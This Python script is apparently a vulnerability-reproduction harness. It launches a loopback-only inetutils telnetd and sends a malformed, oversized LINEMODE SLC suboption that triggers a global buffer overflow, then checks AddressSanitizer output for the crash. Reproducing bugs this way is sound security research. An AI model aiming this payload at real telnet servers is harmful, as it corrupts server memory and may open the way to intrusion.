#!/usr/bin/env python3
"""Drive a plant-started, loopback-only pinned telnetd over a real TCP socket.

telnetd(8) in inetutils 2.7/2.8 is an inetd-style server: it expects the
accepted socket on fd 0.  This script starts a 127.0.0.1-only listener,
accepts one client, execs telnetd with the accepted socket as stdin, answers
the daemon's option negotiation, and sends one LINEMODE LM_SLC suboption.

The daemon may toggle LINEMODE while its localstat()/pty state settles, so
the client sends IAC WILL LINEMODE and the SLC suboption back-to-back in the
same write: telrcv() processes them in wire order, and willoption() has set
his_state_will(LINEMODE) before suboption() reaches the LM_SLC branch.

No external system is contacted; no other listener port is used.
"""
import argparse
import os
import select
import socket
import subprocess
import time
from pathlib import Path

IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240
TELOPT_LINEMODE, LM_SLC, LM_MODE = 34, 3, 1

ap = argparse.ArgumentParser()
ap.add_argument("--telnetd", required=True)
ap.add_argument("--out", required=True)
ap.add_argument("--triplets", type=int, default=50)
ap.add_argument("--func", default="42")
ap.add_argument("--flag", default="41")
ap.add_argument("--val", default="5a")
ap.add_argument("--exec", default="/bin/sleep 300")
ap.add_argument("--wait", type=float, default=2.0)
ap.add_argument("--no-debug", action="store_true", help="2.8 removed -D/--debug")
a = ap.parse_args()

out = Path(a.out)
out.parent.mkdir(parents=True, exist_ok=True)
log = open(str(out) + ".daemon.log", "wb")

triplet = bytes((int(a.func, 16), int(a.flag, 16), int(a.val, 16)))
payload = bytes((IAC, SB, TELOPT_LINEMODE, LM_SLC)) + triplet * a.triplets + bytes((IAC, SE))

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("127.0.0.1", 0))
listener.listen(1)
port = listener.getsockname()[1]
client = socket.create_connection(("127.0.0.1", port), timeout=5)
server, peer = listener.accept()
listener.close()

env = dict(os.environ)
env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=1"
argv = [a.telnetd] + ([] if a.no_debug else ["--debug=options=3"]) + ["-h", "-E", a.exec]
proc = subprocess.Popen(argv, stdin=server, stdout=log, stderr=log, env=env)
server.close()  # child owns the accepted socket now

seen = bytearray()        # every byte received from the daemon
sent = bytearray()        # every byte we send
exploit_sent = False
accepted = False          # daemon sent its LM_MODE SB
sub_seen = []


def send(data: bytes) -> None:
    sent.extend(data)
    client.sendall(data)


def handle_iac(buf: bytearray, i: int) -> int:
    """Consume one IAC command at i; return index just past it."""
    global exploit_sent, accepted
    if i + 1 >= len(buf):
        return i
    verb = buf[i + 1]
    if verb in (DO, DONT, WILL, WONT):
        if i + 2 >= len(buf):
            return i
        opt = buf[i + 2]
        if verb == DO:
            reply = WILL if opt == TELOPT_LINEMODE else WONT
        elif verb == DONT:
            reply = WONT
        else:
            reply = DONT
        send(bytes((IAC, reply, opt)))
        if opt == TELOPT_LINEMODE and verb == DO and not exploit_sent:
            send(payload)  # same TCP stream, processed right after WILL
            exploit_sent = True
        return i + 3
    if verb == SB:
        j = i + 2
        while j + 1 < len(buf) and not (buf[j] == IAC and buf[j + 1] == SE):
            j += 1
        body = bytes(buf[i + 2:j])
        j = j + 2 if j + 1 < len(buf) else len(buf)
        sub_seen.append(body.hex())
        if len(body) >= 2 and body[0] == TELOPT_LINEMODE and body[1] == LM_MODE:
            accepted = True
        return j
    return i + 2


def spin(seconds: float) -> None:
    end = time.time() + seconds
    parsed = 0
    while time.time() < end:
        r, _, _ = select.select([client], [], [], 0.05)
        if r:
            try:
                chunk = client.recv(8192)
            except (ConnectionResetError, OSError):
                break
            if not chunk:
                break
            seen.extend(chunk)
        while parsed < len(seen):
            if seen[parsed] == IAC:
                nxt = handle_iac(seen, parsed)
                if nxt <= parsed:
                    break
                parsed = nxt
            else:
                parsed += 1


spin(a.wait)
alive = proc.poll() is None
if alive:
    proc.terminate()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=3)
client.close()
log.flush()
log.close()
daemon_log = Path(str(out) + ".daemon.log").read_bytes()
ascii_log = daemon_log.decode("utf-8", "replace")
summary = "\n".join([
    f"telnetd={a.telnetd}",
    f"listen=127.0.0.1:{port} (ephemeral, plant-started)",
    "argv=" + " ".join(argv),
    f"triplets={a.triplets} triplet={triplet.hex()} payload_len={len(payload)}",
    f"exploit_sent={exploit_sent} accepted={accepted} subopts_total={len(sub_seen)}",
    "greeting=" + bytes(seen[:min(len(seen), 256)]).hex(),
    f"our_bytes_len={len(sent)}",
    "our_bytes_first=" + bytes(sent[:256]).hex(),
    f"daemon_exit={proc.returncode} alive_before_terminate={alive}",
    "asan_error=" + str("ERROR: AddressSanitizer" in ascii_log),
    "asan_global_overflow=" + str("global-buffer-overflow" in ascii_log),
    "asan_write1=" + str("WRITE of size 1" in ascii_log),
    "add_slc_frame=" + str("add_slc" in ascii_log),
]) + "\n"
Path(str(out) + ".summary.txt").write_text(summary)
print(summary)
print("--- daemon log tail ---")
print("\n".join(ascii_log.splitlines()[-45:]))
